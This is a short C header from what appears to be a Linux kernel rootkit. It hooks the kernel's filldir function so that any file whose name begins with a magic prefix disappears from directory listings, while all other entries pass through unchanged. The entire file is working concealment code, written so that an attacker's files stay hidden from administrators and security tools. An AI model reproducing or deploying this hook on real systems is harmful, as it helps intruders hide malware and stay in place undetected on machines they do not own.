// https://github.com/torvalds/linux/blob/4a1d8ababde685a77fd4fd61e58f973cbdf29f8c/fs/readdir.c#L259
#ifndef FILLDIR_H
#define FILLDIR_H
#include "../config.h"

static asmlinkage int(*original_filldir)(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type);
static asmlinkage int filldir_hook(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type) {
    // Hide files that start with the magic prefix
    if (strncmp(name, MAGIC_PREFIX, strlen(MAGIC_PREFIX)) == 0) {
        return 0;  // Don't show this file (skip it)
    }

    // Show all other files by calling the original function
    return original_filldir(ctx, name, namlen, offset, ino, d_type);
}

#endif // !FILLDIR_H
